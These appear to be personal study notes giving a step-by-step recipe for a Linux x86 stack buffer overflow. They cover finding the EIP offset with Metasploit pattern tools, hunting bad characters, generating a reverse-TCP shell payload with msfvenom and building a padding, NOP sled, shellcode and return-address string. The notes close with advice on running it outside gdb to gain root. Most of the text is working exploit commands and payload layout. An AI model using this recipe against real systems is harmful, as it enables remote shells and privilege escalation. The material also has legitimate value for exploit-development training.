1. To determine the offset between buffer and return address (or eip). We can follow the below steps (tested on parrot OS):

	- `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 (or any number of overflow you have) > pattern.txt`
	
	- Copy the contents of pattern.txt
	
	- Using gdb `run $(python -c “print(‘<pattern.txt content>’)”)`
	
	- run `info registers eip`
	
	- `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <content of register eip>`

2. Finding bad characters for your system can be done by overflow \x00\x01...\xff and seeing which of them became \x00 in the stack. Repeatedly remove that character and see the next \x00.

	- use this command: `msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c –arch x86 –platform linux –bad-chars “<chars>” --out <filename>`

	- example: `msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c –arch x86 –platform linux –bad-chars “\x00\x09\x0a\x20” --out shellcode`
3. Overflow with ‘\x55’ * (total – shellcodesize – num_nops - 4) and ‘\x90’*num_nops
	- Go to stack and see the address of any \x90
	- Overflow with '\x55' * (total – shellcodesize – num_nops - 4) + ‘\x90’ * num_nops + shellcode + address of the nop instructions

	eg.: `run` `$(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')`

- Make sure not to do this in gdb but rather in command line. It might not give root access otherwise. Because gdb may not have root access itself.